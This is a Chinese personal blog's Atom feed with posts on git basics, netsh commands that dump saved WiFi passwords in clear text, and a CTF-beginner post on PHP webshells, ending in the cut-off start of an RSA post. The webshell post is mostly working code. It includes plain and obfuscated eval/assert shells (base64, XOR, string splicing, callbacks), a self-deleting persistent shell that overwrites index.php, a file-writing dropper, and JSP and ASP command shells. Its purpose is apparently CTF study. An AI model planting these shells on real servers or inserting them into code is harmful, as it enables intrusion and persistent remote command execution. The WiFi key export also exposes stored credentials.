<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ggy的个人博客</title>
  
  <subtitle>hello,world.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://ggyggy666.github.io/"/>
  <updated>2021-03-10T08:28:12.137Z</updated>
  <id>https://ggyggy666.github.io/</id>
  
  <author>
    <name>ggy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>git学习</title>
    <link href="https://ggyggy666.github.io/2021/03/08/git%E5%AD%A6%E4%B9%A0/"/>
    <id>https://ggyggy666.github.io/2021/03/08/git%E5%AD%A6%E4%B9%A0/</id>
    <published>2021-03-08T13:31:45.949Z</published>
    <updated>2021-03-10T08:28:12.137Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;dd&quot; &gt;&gt; README.md#在工作区新建一个文件</span><br><span class="line">git init#git初始化</span><br><span class="line">git add README.md#将工作区文件添加到暂存区</span><br><span class="line">git commit -m &quot;first commit&quot;#将暂存区的文件提交到本地仓库，并添加描述“first commit”</span><br><span class="line">git remote add origin &#39;git的地址&#39;#需要在GitHub新建一个仓库，然后复制那个仓库地址。origin是这个地址的描述。</span><br><span class="line">git push -u origin master#将origin添加到master分支。</span><br></pre></td></tr></table></figure><p>git remote这个只需要第一次连接时才用。之后就不用了。如果是添加或者修改文件，不用分支的话，只需要:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add xxx</span><br><span class="line">git commit -m &quot;xx&quot;</span><br><span class="line">git push</span><br></pre></td></tr></table></figure><p>通过建立分支，可以方便获取每次修改的文件内容，即：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b content#创建并切换到content分支</span><br><span class="line">这个时候去修改文件内容，完之后。</span><br><span class="line">git status#查看文件的状态</span><br><span class="line">git add xxx#将工作区文件添加到暂存区</span><br><span class="line">git commit -m &quot;xxx&quot;#提交到本地仓库，这个时候可以描述是&quot;second commit&quot;</span><br><span class="line">git checkout master#切换回master分支</span><br><span class="line">git merge content#将content分支合并到master分支。这样在content分区修改了的内容就会被合并到master分支</span><br><span class="line">git log#查看文件日志</span><br><span class="line">git push#推送到GitHub</span><br></pre></td></tr></table></figure><p>其它操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone 网址</span><br><span class="line">git mv [原文件] [新文件]#修改文件名</span><br><span class="line">git rm [文件名]#删除文件</span><br><span class="line">git pull [远程主机别名]&lt;远程分支名称&gt;:[本地分支名称]#下载代码并快速合并</span><br><span class="line">git push [远程主机别名][本地分支名称]:&lt;远程分支名称&gt;</span><br></pre></td></tr></table></figure><p>遇到一个问题，git无法连接上GitHub了，搞了一下午，最后终于解决了。使用SSH连接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.  git remote set-url origin git@github.com:xxx（仓库ssh地址）</span><br><span class="line"> 2.https:&#x2F;&#x2F;blog.csdn.net&#x2F;YanceChen2013&#x2F;article&#x2F;details&#x2F;82218356</span><br><span class="line">3.第二步会遇到问题，看下面链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;argleary&#x2F;article&#x2F;details&#x2F;100638560</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>获取电脑连接的WiFi密码</title>
    <link href="https://ggyggy666.github.io/2021/03/08/%E8%8E%B7%E5%8F%96%E7%94%B5%E8%84%91%E8%BF%9E%E6%8E%A5%E7%9A%84WiFi%E5%AF%86%E7%A0%81/"/>
    <id>https://ggyggy666.github.io/2021/03/08/%E8%8E%B7%E5%8F%96%E7%94%B5%E8%84%91%E8%BF%9E%E6%8E%A5%E7%9A%84WiFi%E5%AF%86%E7%A0%81/</id>
    <published>2021-03-08T09:57:42.352Z</published>
    <updated>2021-03-08T10:05:58.127Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>win+R，输入cmd，进入命令行</p></li><li><p>粘贴：<code>netsh wlan export profile key=clear &amp;&amp; type *.xml &gt; 666.txt</code>, 回车。</p></li><li><p>打开C盘-&gt;用户-&gt;当前用户名的文件夹下，拉到后面即可看到xml文件。</p><p><img src="/2021/03/08/%E8%8E%B7%E5%8F%96%E7%94%B5%E8%84%91%E8%BF%9E%E6%8E%A5%E7%9A%84WiFi%E5%AF%86%E7%A0%81/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210308180000770.png" alt="image-20210308180000770"></p><p>打开即可看到WiFi用户名和密码。</p><p><img src="/2021/03/08/%E8%8E%B7%E5%8F%96%E7%94%B5%E8%84%91%E8%BF%9E%E6%8E%A5%E7%9A%84WiFi%E5%AF%86%E7%A0%81/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210308180059098.png" alt="image-20210308180059098"></p><p>但是有的WiFi加密了就没办法了。</p><p><img src="/2021/03/08/%E8%8E%B7%E5%8F%96%E7%94%B5%E8%84%91%E8%BF%9E%E6%8E%A5%E7%9A%84WiFi%E5%AF%86%E7%A0%81/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210308180142401.png" alt="image-20210308180142401"></p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Netsh WLAN show profiles  --- 显示了每个无线适配器在计算机上存储的所有配置文件</span><br><span class="line"></span><br><span class="line">Netsh WLAN show profiles interface&#x3D;&quot;WLAN&quot;  ---显示特定无线适配器的配置文件列表</span><br><span class="line"></span><br><span class="line">Netsh WLAN show drivers ---获取有关计算机的无线适配器的驱动程序信息</span><br><span class="line"></span><br><span class="line">Netsh WLAN show wirelesscapabilities  ---查看所有受支持的无线适配器功能</span><br><span class="line"></span><br><span class="line">Netsh WLAN show interfaces --- 查看特定的无线适配器信息</span><br><span class="line"></span><br><span class="line">Netsh WLAN show profile name&#x3D;&quot;Profile_Name&quot; key&#x3D;clear  ---查看密码  如果您丢失了密码并且忘记了将另一台设备连接到特定Wi-Fi接入点的网络安全密钥，则可以使用以下命令查看网络安全密钥</span><br><span class="line"></span><br><span class="line">Netsh WLAN set profileparameter name&#x3D;&quot;Profile_Name&quot; connectionmode&#x3D;manual   --- 防止计算机自动连接到其他网络，自动停止连接超出的网络</span><br><span class="line"></span><br><span class="line">Netsh WLAN set profileparameter name&#x3D;&quot; Profile_Name&quot; connectionmode&#x3D;auto ---Windows 10将始终优先选择您选择自动连接的那些网络。如果要在优先级列表中向上移动网络</span><br><span class="line"></span><br><span class="line">Netsh WLAN delete profile name&#x3D;&quot;Profile_Name&quot; --- 删除密码和配置</span><br><span class="line"></span><br><span class="line">Netsh WLAN export profile key&#x3D;clear folder&#x3D;&quot;Folder_Path&quot; ---导出所有无线网络配置文件</span><br><span class="line"></span><br><span class="line">Netsh WLAN export profile name&#x3D;&quot;Profile_Name&quot; key&#x3D;clear folder&#x3D;&quot;Folder_Path&quot;   ---导入特定配置</span><br><span class="line"></span><br><span class="line">Netsh WLAN add profile filename&#x3D;&quot;File_Path.XML&quot; ---导入配置</span><br><span class="line"></span><br><span class="line">Netsh WLAN add profile filename&#x3D;&quot;Path_With_Filename.xml&quot; Interface&#x3D;&quot;Wireless Network Connection&quot; user&#x3D;current  --- 将配置文件导入到特定的无线接口而仅导入到当前用户</span><br><span class="line"></span><br><span class="line">Netsh WLAN show WLANreport   --- 创建无线报告  对与接入点的无线连接进行故障排除</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ol&gt;
&lt;li&gt;&lt;p&gt;win+R，输入cmd，进入命令行&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;粘贴：&lt;code&gt;netsh wlan export profile key=clear &amp;amp;&amp;amp; type *.xml &amp;gt; 666.txt&lt;/code&gt;, 回车。&lt;/
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>涅普CTF入门-一句话木马</title>
    <link href="https://ggyggy666.github.io/2021/02/20/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
    <id>https://ggyggy666.github.io/2021/02/20/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</id>
    <published>2021-02-20T10:26:03.000Z</published>
    <updated>2021-02-20T12:19:49.644Z</updated>
    
    <content type="html"><![CDATA[<p>今天学习web的一句话木马。</p><h1 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h1><ol><li>木马能上传到服务器。</li><li>上传后能保留并被解析执行。</li><li>知道上传后的路径。</li></ol><h1 id="eval和assert"><a href="#eval和assert" class="headerlink" title="eval和assert"></a>eval和assert</h1><p>assert在PHP7.1之后被废弃了。eval不能被可变函数调用，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a &#x3D; &quot;eval&quot;;</span><br><span class="line">@$a(@$_GET[&#39;x&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h1 id="有-和无-的区别"><a href="#有-和无-的区别" class="headerlink" title="有@和无@的区别"></a>有@和无@的区别</h1><p>有@不会显示报错，没有就会显示。比如assert，PHP&gt;7.1之后就废弃了，继续使用会报错，如果用了@</p><p><img src="/2021/02/20/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210220185750212.png" alt="image-20210220185750212"></p><p>页面一片空白。没有使用@,</p><p><img src="/2021/02/20/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210220185843443.png" alt="image-20210220185843443"></p><p>直接报错。</p><h1 id="一句话木马及变种"><a href="#一句话木马及变种" class="headerlink" title="一句话木马及变种"></a>一句话木马及变种</h1><h2 id="原型"><a href="#原型" class="headerlink" title="原型"></a>原型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&#x2F;&#x2F;用蚁剑连，密码是cmd</span><br><span class="line">&lt;?php @eval(&quot;phpinfo();&quot;);?&gt;&#x2F;&#x2F;PHP探针</span><br></pre></td></tr></table></figure><p>需要注意的是，使用蚁剑连的话需要使用$_POST, 使用$_GET是不行的。$_REQUEST也是可以的。</p><h2 id="使用JS代码"><a href="#使用JS代码" class="headerlink" title="使用JS代码"></a>使用JS代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&#39;cmd&#39;])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>这个在PHPStudy的环境没有解析成功?</p><h2 id="拆分拼接"><a href="#拆分拼接" class="headerlink" title="拆分拼接"></a>拆分拼接</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arr &#x3D; explode(&quot;,&quot;,&quot;a,s,d,f,s,d,e,k,r,t&quot;);</span><br><span class="line">$payload &#x3D; $arr[0].$arr[1].$arr[4].$arr[6].$arr[8].$arr[9];</span><br><span class="line">@$payload(@$_GET[&#39;cmd&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>PHP版本需要小于7.1才能拼接assert, 而拼接eval是不行的。</p><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; base64_decode(&quot;YXNzZXJ0&quot;);</span><br><span class="line">$a($_POST[&#39;cmd&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>同样PHP&lt;7.1。</p><h2 id="随机异或"><a href="#随机异或" class="headerlink" title="随机异或"></a>随机异或</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    &#x2F;&#x2F;也可以用十六进制进行进一步加密,例如</span><br><span class="line">    &#x2F;&#x2F;$r&#x3D;&quot;x4d&quot;^&quot;x3f&quot;;</span><br><span class="line">    $a&#x3D;&quot;Y&quot;^&quot;8&quot;;&#x2F;&#x2F;a</span><br><span class="line">    $b&#x3D;&quot;T&quot;^&quot;&#39;&quot;;&#x2F;&#x2F;s</span><br><span class="line">    $c&#x3D;&quot;*&quot;^&quot;O&quot;;&#x2F;&#x2F;e</span><br><span class="line">    $d&#x3D;&quot;M&quot;^&quot;?&quot;;&#x2F;&#x2F;r</span><br><span class="line">    $e&#x3D;&quot;-&quot;^&quot;Y&quot;;&#x2F;&#x2F;t</span><br><span class="line">    $payload&#x3D;$a.$b.$b.$c.$d.$e;&#x2F;&#x2F;拼接成assert</span><br><span class="line">    @$payload(@$_POST[&#39;x&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $a&#x3D;&#39;assert&#39;;</span><br><span class="line">    $b&#x3D;&#39;a&#39;;</span><br><span class="line">    &#x2F;&#x2F;$$b&#x3D;$a&#x3D;&#39;assert&#39;</span><br><span class="line">    $$b($_POST[&#39;x&#39;]); &#x2F;&#x2F;assert($_POST[&#39;x&#39;])</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="可变函数"><a href="#可变函数" class="headerlink" title="可变函数"></a>可变函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@$_REQUEST[&#39;e&#39;](@$_REQUEST[&#39;x&#39;]);</span><br><span class="line">&#x2F;&#x2F;传入e&#x3D;assert&amp;x&#x3D;command</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="使用回调函数"><a href="#使用回调函数" class="headerlink" title="使用回调函数"></a>使用回调函数</h2><p>使用到：<code>call_user_func($callback, $parameter)</code>，$callback是回调函数名称，parameter是参数。使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"> @call_user_func($_GET[&#39;id&#39;],$_GET[&#39;a&#39;]);</span><br><span class="line"> &#x2F;&#x2F;传入id&#x3D;eval&amp;a&#x3D;command</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2021/02/20/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210220191447775.png" alt="image-20210220191447775"></p><p>报错了？？</p><h2 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ignore_user_abort(true);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">unlink(__FILE__);</span><br><span class="line">$file &#x3D; &#39;.&#x2F;index.php&#39;;</span><br><span class="line">$code &#x3D; &#39;&lt;?php if($_GET[&quot;pass&quot;]&#x3D;&#x3D;&quot;ggy&quot;)&#123;@eval($_GET[&quot;cmd&quot;]);&#125; ?&gt;&#39;;</span><br><span class="line">&#x2F;&#x2F;pass&#x3D;nepnep 用法：pass&#x3D;nepnep&amp;cmd&#x3D;command</span><br><span class="line">file_put_contents($file,$code);</span><br><span class="line">usleep(5000);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>ignore_user_abort(true): 设置成true，断开连接仍然执行一句话。</li><li>set_time_limit(0): 0表示没有限制。</li><li><code>unlink(__FILE__)</code>:  删除文件自身。</li><li>usleep(): 延迟执行当前脚本。</li></ul><p><img src="/2021/02/20/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/C:%5CUsers%5C29924%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210220191950219.png" alt="image-20210220191950219"></p><p>崩了。。</p><p>之后访问:<code>xxx/index.php?pass=ggy&amp;cmd=phpinfo();</code>即可。</p><h2 id="利用函数和类"><a href="#利用函数和类" class="headerlink" title="利用函数和类"></a>利用函数和类</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function ggy($a)&#123;</span><br><span class="line">assert($a);</span><br><span class="line">&#125;</span><br><span class="line">@ggy($_POST[&#39;cmd&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ggy&#123;</span><br><span class="line">public $a&#x3D;&#39;&#39;;</span><br><span class="line">function __destruct()&#123;</span><br><span class="line">assert(&quot;this-&gt;$a&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$b&#x3D;new ggy();</span><br><span class="line">$b-&gt;a&#x3D;$_POST[&#39;cmd&#39;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#39;filename&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">$d&#x3D;&#39;data&#39;;</span><br><span class="line">$$d&#x3D;$_GET[&#39;text&#39;];  &#x2F;&#x2F;$data</span><br><span class="line">$f&#x3D;&#39;fp&#39;;</span><br><span class="line">$$f&#x3D;fopen($_GET[&#39;filename&#39;],&#39;wb&#39;);  &#x2F;&#x2F;$fp</span><br><span class="line">echo fwrite($fp,$data)?&quot;save success&quot;:&quot;save fail&quot;;</span><br><span class="line">fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>访问：<code>/word1.php?filename=ggy.php&amp;text=&lt;?%20phpinfo();?&gt;</code>, 在目录下生成ggy.php。访问即可。</p><h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @preg_replace(&quot;&#x2F;abcd&#x2F;e&quot;,$_GET[&#39;a&#39;],&quot;abcdefg&quot;); ?&gt;</span><br></pre></td></tr></table></figure><p>PHP新版本不支持了。用的是preg_replace_callback()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function test()&#123;</span><br><span class="line">eval($_GET[&#39;cmd&#39;]);</span><br><span class="line">&#125;</span><br><span class="line">preg_replace_callback(&quot;&#x2F;abcd&#x2F;&quot;,test,&quot;abcde&quot;); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>匹配到就调用test。访问:<code>xxx.php?cmd=phpinfo();</code></p><h2 id="str-replace"><a href="#str-replace" class="headerlink" title="str_replace"></a>str_replace</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; str_replace(&quot;b&quot;, &quot;&quot;, &quot;absbsbebrbt&quot;);</span><br><span class="line">$a($_GET[&#39;cmd&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="pares-str"><a href="#pares-str" class="headerlink" title="pares_str"></a>pares_str</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $str &#x3D; &quot;a&#x3D;assert&quot;;                  parse_str($str);</span><br><span class="line">    $a($_POST[&#39;hacker&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="substr-replace"><a href="#substr-replace" class="headerlink" title="substr_replace"></a>substr_replace</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a&#x3D;substr_replace(&quot;assexx&quot;,&quot;rt&quot;,4);</span><br><span class="line">@$a($_POST[&#39;cmd&#39;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="短木马"><a href="#短木马" class="headerlink" title="短木马"></a>短木马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?&#x3D;phpinfo()?&gt;</span><br></pre></td></tr></table></figure><h2 id="JSP木马"><a href="#JSP木马" class="headerlink" title="JSP木马"></a>JSP木马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;0&quot;));%&gt;</span><br></pre></td></tr></table></figure><h2 id="ASP木马"><a href="#ASP木马" class="headerlink" title="ASP木马"></a>ASP木马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%execute(request(&quot;0&quot;))%&gt;</span><br></pre></td></tr></table></figure><p>参考:</p><p><a href="https://blog.csdn.net/weixin_46270220/article/details/113745113" target="_blank" rel="noopener">https://blog.csdn.net/weixin_46270220/article/details/113745113</a></p><p><a href="https://www.cnblogs.com/white-album2/p/9851468.html" target="_blank" rel="noopener">https://www.cnblogs.com/white-album2/p/9851468.html</a></p><p>涅普的PPT</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天学习web的一句话木马。&lt;/p&gt;
&lt;h1 id=&quot;条件&quot;&gt;&lt;a href=&quot;#条件&quot; class=&quot;headerlink&quot; title=&quot;条件&quot;&gt;&lt;/a&gt;条件&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;木马能上传到服务器。&lt;/li&gt;
&lt;li&gt;上传后能保留并被解析执行。&lt;/li&gt;
&lt;li
      
    
    </summary>
    
    
      <category term="CTF入门" scheme="https://ggyggy666.github.io/categories/CTF%E5%85%A5%E9%97%A8/"/>
    
    
      <category term="涅普CTF入门-一句话木马" scheme="https://ggyggy666.github.io/tags/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>涅普CTF入门-crypt（二）</title>
    <link href="https://ggyggy666.github.io/2021/02/16/%C2%96%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-crypt%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>https://ggyggy666.github.io/2021/02/16/%C2%96%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-crypt%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2021-02-16T03:17:35.000Z</published>
    <updated>2021-02-16T04:03:11.909Z</updated>
    
    <content type="html"><![CDATA[<p>今天主要学习RSA。</p><h1 id="简单实现RSA"><a href="#简单实现RSA" class="headerlink" title="简单实现RSA"></a>简单实现RSA</h1><h2 id="求逆元"><a href="#求逆元" class="headerlink" title="求逆元"></a>求逆元</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">d &#x3D; invert(e, (p-1)*(q-1))</span><br></pre></td></tr></table></figure><h2 id="判断素数"><a href="#判断素数" class="headerlink" title="判断素数"></a>判断素数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">print(isPrime(7))</span><br></pre></td></tr></table></figure><h2 id="求最大公因数"><a href="#求最大公因数" class="headerlink" title="求最大公因数"></a>求最大公因数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">print(GCD(12, 18))&#x2F;&#x2F;6</span><br></pre></td></tr></table></figure><h2 id="开n次方根"><a href="#开n次方根" class="headerlink" title="开n次方根"></a>开n次方根</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import iroot</span><br><span class="line">print(iroot(4, 2))&#x2F;&#x2F;对4开平方根</span><br></pre></td></tr></table></figure><h2 id="RSA加密"><a href="#RSA加密" class="headerlink" title="RSA加密"></a>RSA加密</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">m &#x3D; 123456</span><br><span class="line">e &#x3D; 65537</span><br><span class="line">p, q &#x3D; getPrime(128), getPrime(128)</span><br><span class="line">n &#x3D; 